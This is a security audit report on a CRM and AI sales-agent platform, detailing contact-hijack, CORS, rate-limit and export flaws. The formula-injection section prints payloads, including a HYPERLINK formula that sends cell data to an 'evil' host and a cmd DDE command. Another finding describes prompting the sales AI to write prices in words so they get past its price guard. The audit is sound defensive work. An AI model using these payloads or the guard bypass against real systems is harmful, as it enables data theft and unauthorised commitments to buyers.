# Security review: Kairox platform v1 (static, read-only)

Date: 18 Nov 2026. Branch `v1-11nov-work-and-architecture-guide` (working tree). Scope: `packages/kx-core-db`, `kx-core-crm`, `kx-core-automation`, `kx-agent-framework`, `apps/arifaa-pack`, plus `infra/server/stacks/env/pack.env.example`.

Method: I read each route and traced it through dependencies, services and SQL. I report an issue only when I followed the whole path. When another layer (a dependency, middleware or DB function) already blocks an attack, I say so and drop it. I changed nothing in the repo.

## Summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 1 |
| Medium | 8 |
| Low | 8 |
| Info | 8 |

Top issues:
1. **H1**: An anonymous website visitor can take over an existing buyer's contact record (overwrite its email and name, take over deal routing). Path: `website.py:292-313` → `crm/services/deals.py:272-334`.
2. **M1**: `KX_SERVICE_TOKEN_SECRET` and `KX_AUTO_TELNYX__CALLBACK_SECRET` keep insecure defaults in production. Start-up does not refuse them, unlike the other secrets.
3. **M2**: CORS trusts the public marketing website with credentials. Any XSS there becomes a staff session takeover through `/v1/auth/refresh`.
4. **M3**: No rate limit on any `/v1/auth/*` route, so the password-reset code can be brute-forced, staff inboxes can be flooded and accounts can be locked out.
5. **M5**: A manual quote skips the minimum-price (special_price) approval when `product_id` is left out.

---

## HIGH

### H1. Unauthenticated contact hijack through website `identify` and the AI `set_contact` tool
- **Where:** `packages/kx-agent-framework/src/kx/agents/website.py:292-313` → `kx/crm/gateway.py:200-204` → `kx/crm/services/deals.py:272-313` (`patch_contact`), `:316-334` (`_merge_into`), `:154-174` (`resolve_deal`), `:108-120` (`find_contact`). The same path runs through the AI tool `kx/agents/tools.py:39-49` when a website chat message contains a phone or email.
- **Attack** (needs only a Turnstile-checked session):
  1. `POST /v1/public/sessions` → session token.
  2. `POST /v1/public/sessions/{sid}/identify` with `{"phone":"+9715XXXXXXX" (victim buyer's number), "email":"attacker@evil.tld", "name":"=HYPERLINK(...)"}`.
  3. `patch_contact` finds the victim contact by phone and calls `_merge_into`. The web deal's `primary_contact_id` becomes the victim's contact. The victim's `visitor_ref` is set to the attacker's session id if it was empty, which is normal for WhatsApp-sourced buyers.
  4. Then, without conditions: `contact.email = attacker email` (`deals.py:290-291`) and `contact.full_name = name` (`:292-299`).
- **Outcome:**
  - **Email redirect.** The victim's contact email now belongs to the attacker. `grants.recipient()` (`grants.py:33-42`) and `issuing._unconfirmed_number_route` (`issuing.py:111-133`) send quotes by email when `preferred_channel=email` or the WhatsApp number is not "reachable". The D32 fallback (WhatsApp not delivered in 10 min → same quote by email) also uses `contact.email`. Send grants are bound to the recipient hash taken from this record, so a grant issued after the overwrite goes to the attacker. The attacker receives the victim's priced quote PDFs and follow-ups. Through the AI tool, `preferred_channel` can also be set to `email`.
  - **Deal routing hijack.** `resolve_deal` picks the contact's newest OPEN deal (`deals.py:166-173`). The attacker's web deal is now that deal. When the real buyer next writes on WhatsApp, their message goes into the attacker's web deal instead of their real negotiation. The attacker's later web messages resolve through `visitor_ref` to the same contact and deal. Any quote issued on that deal then appears in `DealContext.latest_quote` / `allowed_prices` to the attacker's chat.
  - **PII disclosure.** `DealContext.contact` (`gateway.py:346-397`, `ContactView`) shows the victim's name and company to the AI on the attacker's session. Asking "what company do you have for me?" can reveal who owns a phone number.
  - **Further effects.** A STOP from the attacker's chat lands on the victim contact (suppression and follow-up cancellation; worth confirming in the live test). The `name` field gives a stored CSV/formula-injection payload (see M4).
- **Why existing guards don't stop it:** Turnstile and the IP/session buckets only limit volume. "Same answer whether or not the buyer was known" hides the result but does nothing about the write. Nothing requires proof that the visitor owns the phone or email before merging and overwriting.
- **Fix:**
  - Never merge or overwrite an existing contact from an unverified channel (web chat or email). Keep the web deal on a stub contact, flag "possible match: contact X" for the salesperson, and merge only after staff confirm or after an OTP/link proves the visitor owns the address.
  - At minimum, never overwrite a non-empty `email` / `phone_e164` / `full_name` from `AiRole.CONTACT_CAPTURE` on the website.
  - Clear `stub.visitor_ref` on merge, and do not route WhatsApp turns to a deal created by an unverified web merge.

---

## MEDIUM

### M1. Insecure secret defaults not refused in production
- **Where:** `kx/core/settings.py:122` (`service_token_secret = "dev-only-change-me"`) and `kx/automation/settings.py:71` (`callback_secret = "dev-only-change-me"`). `arifaa_pack/container.py:575-592, 615-616` refuses to start in staging/production without the JWT key, the TOTP key and the Turnstile key, but has no check for these two. `pack.env.example:31,89` ship `CHANGE` as the value.
- **Attack** (if the default or `CHANGE` is left in place):
  - Unsubscribe tokens are `sha256("email:<addr>")` + HMAC(secret). The address hash needs no secret (`identity.py:92-95`), so the attacker computes `make_token(secret, hash)` (`unsubscribe.py:302-312`) and sends `POST /v1/public/unsubscribe?t=…`. That opts out any buyer whose email they know, with scope `all` (email, WhatsApp, calls), and it cannot be undone by the AI.
  - The same secret signs website session tokens (`website.py:212-216`). Forging one gives a session for any visitor id.
  - The Telnyx callback secret forges `t=` tokens for `/webhooks/telnyx/gather/{attempt}`. Sending `Digits=2` escalates approvals, and forged status callbacks rewrite call logs. The Ed25519 check is skipped when the header is absent (L5).
- **Fix:** add both secrets to the production start-up refusal list. Reject `dev-only-change-me`, `CHANGE` and anything under 32 bytes.

### M2. CORS lets the public website make credentialed calls to the staff API
- **Where:** `arifaa_pack/api.py:47-53` (`allow_credentials=True`, origins from config), `pack.env.example: KX_APP_CORS_ORIGINS=["https://www.arifapack.com","https://crm.arifapack.com"]`, refresh cookie `SameSite=Lax` (`crm/api/auth.py:124-134`).
- **Attack:** `www.` and `api.` are the same site, so SameSite=Lax still sends `kx_refresh` on a `fetch(..., {credentials:'include'})` from `www.arifapack.com`. CORS lets `www` read the response. Any XSS or script compromise on the public Next.js site or its Payload CMS content can therefore call `POST https://api.arifapack.com/v1/auth/refresh` while a staff member browses the site, read `access_token` (with `mfa=true` if the session was TOTP), and act as that staff member, including approvals.
- **Why existing guards don't stop it:** HttpOnly stops scripts reading the cookie, but the attacker doesn't need to read it. The endpoint swaps it for a token in the response body.
- **Fix:** allow credentials only for the CRM origin. Serve `/v1/public/*` without credentials to `www`, or use a separate CORS middleware per router. Consider `SameSite=Strict` and a CSRF or Origin check on `/v1/auth/refresh`.

### M3. No rate limiting on staff auth routes; password-reset code brute force; lockout DoS
- **Where:** `crm/api/auth.py:145-282` (no limiter), `crm/services/auth.py:405-458`.
- **Attacks:**
  - **Reset brute force.** Every `POST /v1/auth/password/reset/start` creates a fresh 6-digit code with 5 tries (`finish_reset` checks only the newest row). Nothing limits starts per account or IP, and wrong codes don't count toward the account lock. Each start gives a 5 in 10^6 chance, so about 140k starts give a 50% hit. That sets the victim's password and revokes all their sessions. It is not full takeover, because the second factor is still needed, but it is a password hijack plus denial of service. It also floods the victim with reset emails.
  - **Lockout DoS.** Five wrong passwords on `/v1/auth/login` lock any staff account for 15 minutes, repeatable forever. The manager or MD can be kept out during approval windows.
- **Fix:**
  - Per-IP and per-account Redis buckets on login, reset/start, reset/finish and mfa/email/send. Reuse `TokenBucketLimiter`.
  - Allow one live reset code per account and cap starts per hour.
  - Count wrong reset codes toward a reset lock.
  - Consider an IP-aware lockout (or CAPTCHA) instead of a global account lock.

### M4. CSV/XLSX formula injection in exports
- **Where:** `crm/api/reports.py:258-310` (`writer.writerows(... str(v) ...)` at :285, `ws.append` at :293-303). The exported columns include buyer-controlled `contacts.full_name`, `designation`, `companies.name`, `website`. These are set from website `identify` `name`, the WhatsApp `profile.name` (`whatsapp.py:211`) and the AI `set_contact` tool.
- **Attack:** a buyer names themselves `=HYPERLINK("https://evil/?"&A2,"click")` or `=cmd|' /C calc'!A0`. A manager exports contacts and opens the file in Excel, and the formula runs. openpyxl also stores any string that starts with `=` as a formula, so the XLSX path is affected too.
- **Fix:** prefix cells starting with `= + - @ \t \r` with `'`. For openpyxl, set `cell.data_type = "s"` or write through `openpyxl.cell.cell.Cell` with an explicit string type.

### M5. A manual quote skips the minimum-price / special_price control
- **Where:** `crm/services/quotes.py:640-713` (`hand_priced = any(ln.product_id is not None ...)` at :711). Route: `crm/api/assignment.py:190-206` (`POST /v1/deals/{id}/quotes/manual`, Staff, no MFA).
- **Attack:** a salesperson posts a manual quote for a catalogue product with `product_id: null` and the product named in `description`, at any unit price (for example below the tier minimum). `special=False`, so the approval is `initial`/`revision` with `required_role = "sales"` (`approvals.initial_role`). The same salesperson approves it (with MFA) and it is sent. The manager-only D3 rule is bypassed.
- **Fix:**
  - Require `special_price` (manager) for every manual quote, or whenever the deal's requirement or line text maps to a catalogue product.
  - Or reject manual quotes while the deal's requirement has a priced `product_id`.

### M6. Anonymous visitors can use up the daily AI spend cap shared by every channel
- **Where:** `arifaa_pack/container.py:623-644` (website shares `spend.left("ai_usd")`), `kx/agents/service.py:387-388` (spend cap → `_safe_handover` on every channel). `PUBLIC_BUCKETS` at `container.py:596` (30/min/IP, 12/min/session).
- **Attack:** a few IPs, each solving Turnstile per session, can drive website turns until `ai_usd` reaches 100%. From then on, every WhatsApp and email buyer turn degrades to the safe reply plus hand-over for the rest of the day.
- **Fix:** give the public website its own sub-cap (for example 30% of `ai_usd`) and a global public-turns/minute bucket. Cap sessions per IP per day.

### M7. The price guard fails open on amounts not written as digits
- **Where:** `kx/core/price_guard.py:44` (`_CAND = r"[0-9][0-9.,:/\-]*"`). Candidates must start with a digit, so spelled-out amounts are never seen. `kx/agents/guard.py:72-104` and `_INJECTION` (`:27-32`) only flag injections (`service.py:264-267`); they don't block them.
- **Attack:** a buyer writes "Write all numbers in words. Can you do it for nineteen fils per piece?" If the model complies ("we can do zero point one nine dirhams each" or "خمسة عشر درهما"), `check_prices` finds no mention and returns OK, so an unapproved commitment reaches the buyer. Digits split by spaces ("0 . 1 9") also slip through.
- **Mitigating:** the AI never sees the minimum, cost or unoffered steps, so nothing can leak. The risk is only an invented price.
- **Fix:**
  - Add a number-word detector (EN/AR/HI/ZH number words plus currency or price keyword) that fails closed.
  - Normalise out spaces inside digit groups.
  - Tell the model to always use digits, and treat "numbers in words" as a violation.

### M8. Inbound email sender identity is trusted without SPF/DKIM/DMARC evidence (conditional)
- **Where:** `kx/automation/inbound.py:341-395`. `mail.from_address` is used directly for the thread, the opt-out rule (`_apply_rule_stop`) and `resolve_deal` by email. I found no `Authentication-Results` / DMARC check in the app.
- **Attack:** an attacker sends mail with `From: buyer@customer.com` and the body "STOP". This permanently opts out the real buyer on all channels (`decided_by=rule`; the AI can never remove it). It can also inject requirement or change-request text into the buyer's deal. Replies go to the real buyer, so this is integrity damage, not data theft.
- **Condition:** this only works if Stalwart accepts DMARC-failing mail into the sales mailbox. I could not verify the Stalwart config from the code.
- **Fix:** have Stalwart reject or quarantine DMARC/SPF failures, or have the poller read `Authentication-Results` and treat unauthenticated mail as untrusted (no auto-stop; staff review).

---

## LOW

### L1. Access tokens can't be revoked; `is_active` and role are not re-checked
- **Where:** `kx/core/auth.py:125-170`.
- **Problem:** `current_principal` trusts the JWT for its 15-minute life. Logout, password change, `reset_mfa` and deactivation (`PATCH /v1/users/{id}` `is_active=false` or a role change) revoke only refresh sessions.
- **Fix:** keep a short `jti`/`user_id` denylist in Redis, or re-check `users.is_active` and role on sensitive routes (approvals, settings, users).

### L2. Unbounded request bodies; no size limit on the price-list import
- **Where:** `unsubscribe.py:373`, `webhooks.py:67, 90`, `cms.py:251` all call `await request.body()` before authenticating. `crm/api/screens.py:162-172` has no size cap at all. `catalogue_workbook.py:141-146` caps at 10 MB, but only after reading the whole body.
- **Problem:** neither uvicorn nor the app limits body size. An unauthenticated multi-hundred-MB POST is buffered in memory (Cloudflare's 100 MB cap applies only if every path goes through it). XLSX zip bombs can blow up `sharedStrings` in openpyxl. The import routes need MFA staff.
- **Fix:** an ASGI body-size middleware (for example 1 MB default, 10 MB for imports), and a check on uncompressed size or ratio before `load_workbook`.

### L3. BOLA on companies
- **Where:** `crm/api/records.py:200-235`.
- **Problem:** any salesperson can list every company and `PATCH /v1/companies/{id}` any company (name, VAT TRN, website, notes), including other reps' customers. Exports scope companies for sales, but list and patch do not. `PATCH /v1/contacts/{id}` also allows `company_id` to point at any company.
- **Fix:** apply the same `visible_to` scoping used for contacts.

### L4. The ADMIN (IT) role passes every deal-edit check
- **Where:** `crm/services/access.py:29-41`.
- **Problem:** `ensure_can_edit` / `ensure_can_view` restrict only `Role.SALES`. An admin can therefore request, revise or manually price quotes, move stages, record opt-outs and payments-adjacent actions on any deal, and export all contacts. Only `check_contact_buyer` excludes admin. The SRS gives admin "users, roles, settings".
- **Fix:** an explicit allow-list per action (admin: view only, or nothing).

### L5. Telnyx Ed25519 verification is optional per request
- **Where:** `kx/automation/webhooks.py:93-102`.
- **Problem:** the signature is checked only when the `telnyx-signature-ed25519` header is present. Leaving the header out skips it, so the URL token (M1) is the only factor.
- **Fix:** when `public_key` is configured, require the header.

### L6. Account enumeration
- **Where:** `crm/services/auth.py:100-104`.
- **Problem:** a locked real account answers 429, while an unknown email always answers 401. `reset/start` awaits the email send only for real users (`crm/api/auth.py:264-274`), which is a timing difference.
- **Fix:** answer 401 for locked accounts too, and send reset mail in a background task.

### L7. `must_change_password` is not enforced; refresh sessions never expire while used
- **Where:** `crm/services/auth.py:239-266, 290-317`.
- **Problem:** the flag is only returned to the UI; the API works fully with a temporary password. Each refresh issues a new 12-hour session, so a session lives forever while in use. `refresh` doesn't check `locked_until` either.
- **Fix:** block every route except `/auth/password` while the flag is set, and set an absolute session lifetime.

### L8. Unvalidated `timezone` / `language` on `ContactPatch` and `ContactEditIn`
- **Where:** `kx/core/contracts.py:157-164`, `crm/api/records.py:58-64`.
- **Problem:** the website AI tool or staff can store `timezone="Not/AZone"`. `AutomationSettings.followup_window` → `Window.parse` → ZoneInfo then raises, and follow-ups for that contact fail. Low impact.
- **Fix:** validate against `zoneinfo.available_timezones()` and a language allow-list.

---

## INFO

- **I1.** FastAPI `/docs`, `/redoc` and `/openapi.json` are public (default `FastAPI(...)` in `api.py:44`). `/healthz/beat` shows the queue lag publicly. Consider disabling the docs in production.
- **I2.** `KX_APP_FORWARDED_ALLOW_IPS=*` (`pack.env.example`) makes uvicorn trust `X-Forwarded-For` from any peer, so `request.client.host` (audit IP in `auth_sessions.ip`) can be spoofed. The website limiter relies on `CF-Connecting-IP` and the host firewall allowing only Cloudflare. Verify that firewall rule.
- **I3.** `kx.core.signed` tokens carry no type or audience claim. Today the secrets and claim names differ (`sid` vs `a`), so there is no confusion, but add `typ` for safety.
- **I4.** Turnstile verification doesn't check `hostname` or `action` in the siteverify response (`adapters.py:366-378`).
- **I5.** `DealContext.concessions_left` is visible to the AI (`get_deal_context` dumps it). It hints at the ladder structure, though not the amounts.
- **I6.** Admin (non-MD) can create `manager` accounts and change the IBAN printed on quotes (`company.py`). Both are journalled and a bank change alerts the MD and manager. Consider requiring the MD for manager-role grants.
- **I7.** Chromium runs `--no-sandbox` on a `file://` HTML page (`pdf.py:279-290`). This is safe only while every template value stays autoescaped (it is today: `autoescape=True`; only `css|safe`, which comes from the package).
- **I8.** The CMS webhook `collection`/`doc_id` go into the CMS fetch path (`adapters.py:135-136`). Only a signed webhook can reach it, and the host is fixed.

---

## Checked and found SOLID

- **JWT:**
  - RS256 only (`algorithms=["RS256"]`), with `aud`, `iss`, `exp`, `iat`, `sub` required (`kx/core/auth.py:125-138`). No `none`/HS confusion.
  - The private key comes from `SecretStr`, and production refuses to start without it (`container.py:587-592`).
  - JWKS publishes the public key only.
- **Roles and MFA:**
  - `require_human_mfa` rejects service tokens and `mfa=false`.
  - `mfa=true` only after TOTP (`amr` has `otp`); an email-code login gives `mfa=false` (`services/auth.py:200, 237`).
  - `ensure_can_approve` re-checks MFA, D1, D3 and the MD takeover (`access.py:69-95`). Approvals are locked `FOR UPDATE` and must be OPEN.
- **Passwords and TOTP:**
  - Argon2id (OWASP parameters) and a dummy hash for unknown users.
  - TOTP uses `hmac.compare_digest` with last-step replay protection, and seeds are Fernet-encrypted at rest.
  - Replacing an active authenticator needs an MFA session plus an email notice (D4).
- **Refresh tokens:** random, stored only as a SHA-256, rotated on every use, and reuse of a rotated token revokes all sessions. The cookie is HttpOnly, Secure, scoped to `/v1/auth`.
- **Login challenge:** single-use, 10-minute TTL, tries capped. Wrong second-factor codes count toward the account lock.
- **IDOR on deals, quotes, timeline, change requests, orders, contacts:** `access.check_view/check_edit` or `visible_to` on every route I traced (`deals.py`, `deal_actions.py`, `quotes.py:40-48`, `change_requests.py` services, `records.py` contacts and orders, `reports.py` exports for sales). `resolve` and `link_revision` check that the version belongs to the same deal. Cost data (`/quote-versions/{id}/costs`) is MD-only.
- **Users:** only the MD can grant or remove the MD role, deactivate an MD or reset an MD's MFA. Nobody can change their own role (`users.py:108-142`). Availability changes are limited to the user themselves, a manager or an admin.
- **Mass assignment:** every input schema lists fields explicitly. PATCH handlers use `model_dump(exclude_unset=True)` over those fields only. `role` in `UserPatchIn` is guarded. ORM rows are never built from raw dicts.
- **SQL:**
  - All `text()` SQL is parameterised (`knowledge.py`; `websearch_to_tsquery(:q)`; the any-word fallback quotes lexemes with `quote_literal`).
  - f-string SQL interpolates only validated identifiers (`events._ident`, `retention._ident`, constant `{SCHEMA}`).
  - Contact search uses bound `ilike` parameters.
- **Templates and email:**
  - Jinja2 `autoescape=True` with `StrictUndefined` for the PDFs.
  - The unsubscribe page HTML-escapes the token and the company name.
  - MIME is built with `EmailMessage(policy=SMTP)`, which rejects CR/LF in headers (no header injection).
  - Meta templates use regex placeholder substitution, not `str.format`.
- **Webhooks:**
  - Meta: HMAC-SHA256 over the raw body, constant-time compare, empty secret refused, deduplicated by message id (`first_receipt`).
  - CMS: HMAC over `timestamp.body`, ±300 s window, constant-time compare, secret required (refuses when unset), `event_id` dedupe, and price-like keys dropped.
  - Telnyx: per-attempt HMAC token with expiry, bound to the attempt id, plus the optional Ed25519 check with a 300 s window (see L5).
- **Send grants:** `crm.consume_send_grant` atomically requires grant id, content SHA, recipient hash, not revoked, not expired, and not consumed (or the same message id, for an idempotent retry) (`db/ddl/01_crm.sql:551-566`). The outbound gate recomputes the content SHA before consuming (`outbound.py:342-354`). There is no replay across messages or recipients. The recipient-binding weakness is upstream (H1).
- **Opt-out gate:** `is_suppressed` checks the address hash and the per-contact suppression before every send. Only the `OPT_OUT_CONFIRMATION` kind with an `opt-out:` key passes after a stop. The kill switch also cancels queued sends.
- **AI-visible data:** `DealContext`/`QuoteView`/`AllowedPrice` carry no cost, markup, minimum or unoffered ladder steps (`gateway.py:346-397`, `allowed_prices` = issued lines and totals plus offered rounds). Tools take `deal_id` from the runtime context, never from model arguments, and tools outside the role are denied (`middleware.py:106-108`). Price-guard regeneration happens once, then a fixed fallback (fail closed for digit amounts). The voice path and graph compose also run the guard.
- **Errors:** `DomainError` → RFC 9457 JSON without stack traces. Unhandled exceptions give Starlette's plain 500 (debug off). Logs mask PII, and the staff-code mailer logs only the exception type.
- **Website:** Turnstile is required outside local (fail closed on outage). Session tokens are HMAC-signed and expire after 2 hours, with session id binding checked (`claims_for`). Per-IP and per-session buckets apply. Voice needs explicit consent plus the spend, kill-switch and slot checks. LiveKit tokens are scoped to one room.
- **LLM loops:** `recursion_limit=30`, per-tier `max_tokens`/timeouts, circuit breaker, daily spend cap.
- **Files:** the logo is limited to PNG/JPEG content types and stored as a data URI (no path writes). The PDF temp directory is `tempfile.TemporaryDirectory`, and nothing user-supplied reaches a filesystem path.

---

## Endpoints for the live tester

### Unauthenticated (no staff JWT)
| Method | Path | Guard |
|---|---|---|
| GET | `/healthz` | none |
| GET | `/healthz/beat` | none (shows queue lag) |
| GET | `/.well-known/jwks.json` | none (public key) |
| GET | `/docs`, `/redoc`, `/openapi.json` | none (FastAPI defaults) |
| POST | `/v1/auth/login` | none, **no rate limit** (M3, L6) |
| POST | `/v1/auth/mfa/totp` | challenge token |
| POST | `/v1/auth/mfa/email/send` | challenge token |
| POST | `/v1/auth/mfa/email/verify` | challenge token |
| POST | `/v1/auth/refresh` | refresh cookie or body token (M2: CORS from www) |
| POST | `/v1/auth/logout` | refresh cookie (optional) |
| POST | `/v1/auth/password/reset/start` | none, **no rate limit**, sends email (M3) |
| POST | `/v1/auth/password/reset/finish` | email + 6-digit code, 5 tries per code (M3) |
| POST | `/v1/public/sessions` | Turnstile + IP bucket |
| POST | `/v1/public/sessions/{session_id}/messages` | session token (HMAC) + buckets (M6, M7) |
| POST | `/v1/public/sessions/{session_id}/voice` | session token + consent + caps |
| POST | `/v1/public/sessions/{session_id}/identify` | session token. **H1: contact merge and overwrite** |
| GET | `/v1/public/unsubscribe?t=` | token (HMAC, M1) |
| POST | `/v1/public/unsubscribe?t=` | token. Opts out on every channel (M1); body unbounded (L2) |
| GET | `/webhooks/whatsapp` | `hub.verify_token` |
| POST | `/webhooks/whatsapp` | `X-Hub-Signature-256` |
| POST | `/webhooks/telnyx/gather/{attempt_id}?t=` | HMAC URL token; Ed25519 only if the header is present (L5, M1) |
| POST | `/webhooks/telnyx/status/{attempt_id}?t=` | same |
| POST | `/webhooks/cms` | `X-Kx-Timestamp` + `X-Kx-Signature` HMAC |

### Authenticated but with weak or missing checks
| Method | Path | Issue |
|---|---|---|
| GET/POST/PATCH | `/v1/companies`, `/v1/companies/{id}` | any staff, any company (L3) |
| PATCH | `/v1/contacts/{id}` | `company_id` any company; `timezone` unvalidated (L3, L8) |
| POST | `/v1/deals/{id}/quotes/manual` | `product_id:null` skips special_price (M5); Staff, no MFA |
| POST | `/v1/deals/{id}/stage`, `/quotes`, `/quotes/revise`, `/opt-out` | ADMIN passes `check_edit` (L4) |
| GET | `/v1/exports/{deals,contacts,companies,orders,products}?format=csv\|xlsx` | formula injection (M4); admin/manager export everything |
| POST | `/v1/price-list/import` | no body-size cap (L2) |
| POST | `/v1/catalogue/workbook/preview`, `/apply` | 10 MB cap checked after a full read; zip-bomb risk (L2) |
| any | every staff route | access token valid up to 15 min after logout or deactivation (L1); `must_change_password` not enforced (L7) |

### Suggested live probes
1. **H1:** seed a contact with phone P and email E. Open a website session and call `identify` with phone P and email `attacker@x`. Check that `crm.contacts.email` changed and that the web deal's `primary_contact_id` is the victim's. Then send a WhatsApp inbound from P and see which deal it lands in.
2. **M1:** with `KX_SERVICE_TOKEN_SECRET` unset, compute `make_token("dev-only-change-me", sha256("email:victim@x"))` and POST to unsubscribe.
3. **M2:** `curl -H "Origin: https://www.arifapack.com" -X OPTIONS /v1/auth/refresh` and check `Access-Control-Allow-Credentials: true` with the origin echoed.
4. **M3:** loop `reset/start` for one account and confirm there is no 429. Five bad logins give a 429 for a real account and a 401 for a fake one.
5. **M4:** `identify` with `name="=1+1"`, then export contacts as CSV and XLSX and check the cell type.
6. **M5:** a manual quote with `product_id:null` below the minimum; check that the approval kind is `initial` and the role is `sales`.
